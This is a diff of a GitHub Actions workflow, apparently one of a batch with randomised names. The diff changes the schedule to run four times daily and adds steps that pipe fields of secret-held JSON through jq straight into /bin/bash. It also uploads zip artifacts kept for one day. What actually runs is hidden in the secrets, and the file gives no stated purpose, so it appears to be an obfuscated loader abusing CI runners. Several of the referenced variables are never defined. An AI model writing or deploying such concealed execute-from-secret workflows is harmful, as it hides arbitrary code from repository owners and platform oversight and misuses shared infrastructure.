@@ -1,32 +1,29 @@
 name: penggangchile
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '2 5/6 * * *'
 
-jobs:  # 3336
+  schedule:
+    - cron: '25 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: penggangchile
         env:
-          wbfm05501: ${{ secrets.wbfm05501 }}
+          lcfde5038: ${{ secrets.lcfde5038 }}
         run: |
-          echo $wbfm05501 | jq -r .iow88 | /bin/bash
-          echo $yz86 | jq -r .buwhb79 | /bin/bash
-          echo $zs815 | jq -r .cvm855 | /bin/bash
-          echo $l9 | jq -r .zgt8 | /bin/bash
-          echo $xlf3067 | jq -r .peuq8 | /bin/bash
-          echo $gmx6761 | jq -r .tv099 | /bin/bash
-          echo $tyzv3 | jq -r .f65140 | /bin/bash
-          echo $pbl2 | jq -r .dhrbk4883 | /bin/bash
-          echo $q125 | jq -r .eov48028 | /bin/bash
-          echo $ai13 | jq -r .bnp4033 | /bin/bash
-          echo $whewa80697 | jq -r .wrbpl029 | /bin/bash
-          echo $e592 | jq -r .phk76 | /bin/bash
-          echo $lc65010 | jq -r .e34675 | /bin/bash
-          echo $sfpsr3 | jq -r .gqguw6797 | /bin/bash
-          echo $cflm192 | jq -r .qc5 | /bin/bash
+          printf '%s' "$lcfde5038" | jq -r .vc752 | /bin/bash
+          echo $oiian8 | jq -r .f6187 | /bin/bash
+          printf '%s' "$slypk62674" | jq -r .zmxmc910 | /bin/bash
+          printf '%s' "$p37" | jq -r .fxa3440 | /bin/bash
+          echo $c50 | jq -r .pjynx1968 | /bin/bash
+          printf '%s' "$s545" | jq -r .fad48 | /bin/bash
+          echo $y2 | jq -r .ch1866 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Q54VHELZ
+          path: "*.zip"
+          retention-days: 1
